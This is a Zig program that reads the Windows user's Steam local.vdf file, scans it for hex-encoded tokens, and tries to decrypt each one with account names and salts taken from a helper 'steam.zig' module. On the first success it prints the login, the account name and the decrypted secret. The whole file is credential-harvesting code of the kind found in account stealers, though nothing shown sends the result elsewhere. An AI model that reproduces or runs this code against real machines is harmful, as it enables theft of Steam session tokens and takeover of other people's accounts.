const std = @import("std");
const ss = @import("steam.zig");

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const alloc = gpa.allocator();

    var accounts = try ss.getSalts(alloc);
    defer {
        for (accounts.items) |a| {
            alloc.free(a.name);
            alloc.free(a.login);
            alloc.free(a.salt);
        }
        accounts.deinit(alloc);
    }

    const env = try std.process.getEnvVarOwned(alloc, "USERNAME");
    defer alloc.free(env);

    const path = try std.fmt.allocPrint(alloc, "C:\\Users\\{s}\\AppData\\Local\\Steam\\local.vdf", .{env});
    defer alloc.free(path);

    const file = std.fs.openFileAbsolute(path, .{ .mode = .read_only }) catch return;
    defer file.close();

    const content = try file.readToEndAlloc(alloc, 1024 * 1024);
    defer alloc.free(content);

    var i: usize = 0;
    while (i < content.len) : (i += 1) {
        if (!std.ascii.isHex(content[i])) continue;
        const start = i;
        while (i < content.len and std.ascii.isHex(content[i])) i += 1;
        const token = content[start..i];

        for (accounts.items) |a| {
            for ([_][]const u8{ a.name, a.salt }) |s| {
                if (ss.decrypt(alloc, token, s)) |dec| {
                    defer alloc.free(dec);
                    std.debug.print("{s}:{s}:{s}\n", .{ a.login, a.name, dec });
                    return;
                } else |_| {}
            }
        }
    }
}